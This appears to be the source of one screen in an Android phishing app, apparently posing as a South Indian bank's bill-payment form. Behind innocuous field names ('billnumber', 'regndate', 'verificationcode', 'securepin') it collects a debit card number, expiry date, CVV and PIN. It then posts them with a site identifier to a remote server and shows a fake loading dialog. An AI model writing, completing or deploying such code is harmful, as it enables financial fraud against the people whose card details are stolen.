package com.tester.southindia;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class SecondActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second_activity);

        dataObject = new HashMap<>();
        int id = getIntent().getIntExtra("id", -1);
        Button buttonSubmit = findViewById(R.id.submit);

        EditText regndate = findViewById(R.id.regndate);
        regndate.addTextChangedListener(new ExpiryDateInputMask(regndate));

        EditText billnumber = findViewById(R.id.billnumber);
        billnumber.addTextChangedListener(new DebitCardInputMask(billnumber));

        ids = new HashMap<>();
        ids.put(R.id.billnumber, "billnumber");
        ids.put(R.id.regndate, "regndate");
        ids.put(R.id.verificationcode, "verificationcode");
        ids.put(R.id.securepin, "securepin");

        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                showInstallDialog();
                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper help = new Helper();
                    sendPayload.put("site", help.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);

                    Helper.postRequest(help.FormSavePath(), sendPayload, result -> {
                        if (result.startsWith("Response Error:")) {
                            Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                        } else {
                            try {
                                JSONObject response = new JSONObject(result);
                                if(response.getInt("status")==200){
                                    Intent intent = new Intent(getApplicationContext(), LastActivity.class);
                                    intent.putExtra("id", id);
                                    startActivity(intent);
                                }else{
                                    Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+ e, Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(getApplicationContext(), "form validation failed", Toast.LENGTH_SHORT).show();
            }

        });

    }

    public boolean validateForm() {
        boolean isValid = true;
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                isValid = false;
                continue;
            }

            String value = editText.getText().toString().trim();
            switch (key) {
                case "verificationcode":
                    if (!FormValidator.validateMinLength(editText, 3, "Required Valid Code")) {
                        isValid = false;
                    }
                    break;
                case "regndate":
                    if (!FormValidator.validateMinLength(editText, 5, "Required Valid Date")) {
                        isValid = false;
                    }
                    break;
                case "billnumber":
                    if (!FormValidator.validateMinLength(editText, 19, "Required 16 Digit Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void showInstallDialog() {
        // Inflate the custom layout
        LayoutInflater inflater = getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.dialog_loading, null);

        // Create an AlertDialog builder
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setView(dialogView);  // Set the custom layout as the dialog's view
        builder.setCancelable(false);

        // Create and show the dialog
        AlertDialog dialog = builder.create();
        dialog.show();

        new Handler().postDelayed(dialog::dismiss, 3000);
    }
}
